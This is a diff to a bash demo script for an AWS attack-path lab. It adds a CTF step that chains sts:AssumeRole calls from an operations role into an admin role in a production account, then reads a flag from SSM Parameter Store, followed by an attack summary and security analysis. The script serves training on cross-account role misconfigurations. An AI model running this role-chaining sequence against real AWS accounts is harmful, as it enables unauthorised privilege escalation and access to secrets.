@@ -234,6 +234,37 @@ echo -e "${GREEN}✓ Successfully demonstrated cross-account role assumption${NC
 # Reset credentials
 unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
 
+# [EXPLOIT]
+# Step 10: Capture the CTF flag
+# Re-assume the ops role and then the admin prod target role to read the flag from SSM.
+echo -e "${YELLOW}Step 10: Capturing CTF flag from SSM Parameter Store${NC}"
+echo "Re-assuming operations role to reach the admin prod target role..."
+OPS_ASSUME_OUTPUT_FLAG=$(aws sts assume-role --role-arn "$OPS_ROLE_ARN" --role-session-name "ops-role-flag" --profile "$OPS_STARTING_USER_PROFILE")
+export AWS_ACCESS_KEY_ID=$(echo "$OPS_ASSUME_OUTPUT_FLAG" | jq -r '.Credentials.AccessKeyId')
+export AWS_SECRET_ACCESS_KEY=$(echo "$OPS_ASSUME_OUTPUT_FLAG" | jq -r '.Credentials.SecretAccessKey')
+export AWS_SESSION_TOKEN=$(echo "$OPS_ASSUME_OUTPUT_FLAG" | jq -r '.Credentials.SessionToken')
+
+PROD_TARGET_ROLE_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/pl-x-account-prod-target-role"
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$PROD_TARGET_ROLE_ARN\" --role-session-name \"prod-target-flag\""
+PROD_TARGET_OUTPUT=$(aws sts assume-role --role-arn "$PROD_TARGET_ROLE_ARN" --role-session-name "prod-target-flag")
+export AWS_ACCESS_KEY_ID=$(echo "$PROD_TARGET_OUTPUT" | jq -r '.Credentials.AccessKeyId')
+export AWS_SECRET_ACCESS_KEY=$(echo "$PROD_TARGET_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
+export AWS_SESSION_TOKEN=$(echo "$PROD_TARGET_OUTPUT" | jq -r '.Credentials.SessionToken')
+
+FLAG_PARAM_NAME="/pathfinding-labs/flags/ops-to-prod-simple-role-assumption-to-admin"
+show_attack_cmd "Attacker (admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
+    exit 1
+fi
+echo ""
+
+unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
+
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
     for cmd in "${ATTACK_COMMANDS[@]}"; do
@@ -241,8 +272,28 @@ if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     done
 fi
 
+# Restore helpful permissions for manual exploration
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+
 echo ""
-echo -e "${YELLOW}Step 10: Security Analysis${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
+echo -e "${GREEN}========================================${NC}"
+echo -e "\n${YELLOW}Attack Summary:${NC}"
+echo "1. Started as: pl-pathfinding-starting-user-operations (ops account, limited permissions)"
+echo "2. Assumed: pl-x-account-ops-role-with-assume-role-star (sts:AssumeRole on *)"
+echo "3. Enumerated prod roles and identified cross-account trust relationships"
+echo "4. Assumed: pl-x-account-prod-target-role (admin-level access in prod account)"
+echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
+
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo -e "  pl-pathfinding-starting-user-operations"
+echo -e "  → (sts:AssumeRole) → pl-x-account-ops-role-with-assume-role-star"
+echo -e "  → (sts:AssumeRole cross-account) → pl-x-account-prod-target-role"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
+
+echo ""
+echo -e "${YELLOW}Step 11: Security Analysis${NC}"
 echo "This demo revealed several critical security issues:"
 echo "1. Operations role has sts:AssumeRole permission on * (all resources)"
 echo "2. This allows assuming ANY role in ANY account"
@@ -262,10 +313,7 @@ echo "This demonstrates the dangers of overly permissive cross-account role assu
 # Standardized test results output
 echo "TEST_RESULT:x-account-from-operations-to-prod-simple-role-assumption:SUCCESS"
 echo "TEST_DETAILS:x-account-from-operations-to-prod-simple-role-assumption:Successfully demonstrated dangerous cross-account role assumption with sts:AssumeRole on *"
-echo "TEST_METRICS:x-account-from-operations-to-prod-simple-role-assumption:ops_role_assumed=true,prod_roles_assumed=3,sts_assume_role_star_demonstrated=true,security_audit_access_gained=true"
-
-# Restore helpful permissions for manual exploration
-restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
+echo "TEST_METRICS:x-account-from-operations-to-prod-simple-role-assumption:ops_role_assumed=true,prod_roles_assumed=3,sts_assume_role_star_demonstrated=true,security_audit_access_gained=true,flag_captured=true"
 
 # Mark demo as active for plabs tracking
 touch "$(dirname "$0")/.demo_active"
